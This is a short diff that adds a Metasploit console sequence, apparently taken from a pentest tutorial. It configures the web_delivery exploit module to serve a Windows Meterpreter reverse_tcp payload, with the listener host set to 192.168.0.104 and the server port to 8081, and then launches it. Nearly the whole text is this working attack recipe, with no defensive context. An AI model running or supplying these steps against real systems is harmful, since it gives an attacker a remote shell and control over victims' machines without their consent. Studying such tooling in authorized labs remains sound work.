@@ -1,0 +1,8 @@
+Type msfconsole and load Metasploit framework
+
+use exploit/multi/script/web_delivery
+msf exploit (web_delivery)>set target 1
+msf exploit (web_delivery)> set payload windows/meterpreter/reverse_tcp
+msf exploit (web_delivery)> set lhost 192.168.0.104 
+msf exploit (web_delivery)>set srvport 8081
+msf exploit (web_delivery)>exploit
